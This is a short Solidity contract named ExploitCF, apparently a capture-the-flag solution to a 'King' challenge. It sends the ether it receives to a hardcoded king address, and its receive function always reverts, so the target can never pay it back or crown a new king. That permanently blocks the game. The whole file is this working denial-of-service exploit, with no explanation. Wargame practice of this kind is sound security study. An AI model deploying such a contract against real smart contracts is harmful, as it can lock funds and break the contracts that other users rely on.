pragma solidity 0.8.4;


contract ExploitCF {

address king = 0x6cBD8EEA91aAcBAC91C0B796625E8F65f4b05A3c;

    function becomeKing() public payable
    {
        
        (bool success, bytes memory result) = payable(king).call{value: msg.value, gas: 5000000}("");

    }

    receive() external payable{
        revert("uh uh uh"); 
    }


}
    
